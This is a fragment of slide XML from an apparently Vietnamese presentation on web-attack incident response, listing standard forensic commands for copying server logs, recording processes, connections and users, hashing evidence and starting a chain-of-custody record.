              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="390" name="Google Shape;390;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909275" y="2634800"/>
            <a:ext cx="5284200" cy="2343600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Acpache access log: sudo cp /var/log/apache2/access.log ~/evidence/</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Apache error log: sudo cp /var/log/apache2/error.log ~/evidence/</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- auth.log: sudo cp /var/log/auth.log ~/evidence/</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> - Query log: sudo cp /var/log/mysql/query.log ~/evidence/</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Suricata log: sudo cp /var/log/suricata/eve.json ~/evidence/</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- pcap: attack.pcap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="391" name="Google Shape;391;p37" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="909263" y="1824037"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="392" name="Google Shape;392;p37"/>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6.2. Thu thập và bảo toàn chứng cứ:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="393" name="Google Shape;393;p37"/>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4" name="Google Shape;394;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5886450" y="2634800"/>
            <a:ext cx="4802700" cy="2863500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>-  Process đang chạy: ps aux &gt; process.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Kiểm tra tiến trình mạng: ss -antp &gt; connections.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- User đăng nhập: who &gt; who.txt, w &gt; session.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Trạng thái hệ thống:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1244600" lvl="0" indent="139700" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>uname -a &gt; system.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1244600" lvl="0" indent="139700" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>uptime &gt;&gt; system.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1244600" lvl="0" indent="139700" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>mount &gt;&gt; system.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="15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98"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="399" name="Google Shape;399;p38" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1568450"/>
            <a:ext cx="10791825" cy="4724400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="400" name="Google Shape;400;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1433138" y="1824025"/>
            <a:ext cx="28956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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Hash chứng cứ: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="401" name="Google Shape;401;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1195025" y="2330000"/>
            <a:ext cx="9158700" cy="1343700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Tạo file hash cho từng file: sha256sum * &gt; hashes.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Kiểm tra: cat hashes.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Đặt file read-only: chmod 444*</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="402" name="Google Shape;402;p38" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="909263" y="1824037"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="403" name="Google Shape;403;p38"/>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6.2. Thu thập và bảo toàn chứng cứ: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="404" name="Google Shape;404;p38"/>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05" name="Google Shape;405;p38"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect t="14895" b="16874"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1838325" y="3381100"/>
            <a:ext cx="8515350" cy="29117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409"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="410" name="Google Shape;410;p39" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1568450"/>
            <a:ext cx="10791825" cy="4724400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="411" name="Google Shape;411;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1433138" y="1824025"/>
            <a:ext cx="28956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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Tạo chuỗi chứng cứ: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412" name="Google Shape;412;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1195025" y="2330000"/>
            <a:ext cx="9158700" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- nano ~/webattack-case/chain_of_custody.txt</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="413" name="Google Shape;413;p39" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
